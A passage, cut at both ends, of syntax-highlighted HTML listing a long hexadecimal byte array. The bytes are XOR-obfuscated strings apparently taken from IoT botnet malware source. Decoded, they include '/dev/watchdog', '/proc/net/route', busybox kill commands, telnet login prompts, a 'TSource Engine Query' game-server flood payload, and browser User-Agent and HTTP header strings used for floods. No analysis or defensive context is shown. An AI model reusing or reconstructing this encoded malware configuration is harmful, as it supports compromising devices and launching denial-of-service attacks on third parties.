class="number">0x00</span>, <span class="number">0x7A</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0x6B</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x77</span>, </span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x7B</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x53</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x16</span>, <span class="number">0x64</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x0C</span>, <span class="number">0x46</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x0C</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x4E</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x13</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x16</span>, <span class="number">0x46</span>, <span class="number">0x4F</span>, <span class="number">0x4D</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0x49</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x4F</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x13</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x7D</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, </span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x6B</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6E</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x67</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x6D</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, <span class="number">0x78</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x58</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x4A</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x16</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0x57</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0x0C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x43</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x47</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x51</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x46</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x57</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x18</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x46</span>, <span class="number">0x44</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x0F</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x5A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x43</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x55</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x49</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x4A</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x46</span>, <span class="number">0x13</span>, <span class="number">0x48</span>, <span class="number">0x11</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x5A</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x4A</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x0E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x4A</span>, <span class="number">0x56</span>, <span class="number">0x4F</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x09</span>, <span class="number">0x5A</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x0E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x4F</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x19</span>, <span class="number">0x53</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x1B</span>, <span class="number">0x0E</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x52</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0x53</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x6E</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x19</span>, <span class="number">0x53</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0x52</span>, <span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x0F</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x0F</span>, <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x6D</span>, </span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, </span><br><span class="line"><span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, </span><br><span class="line"><span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, </span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span 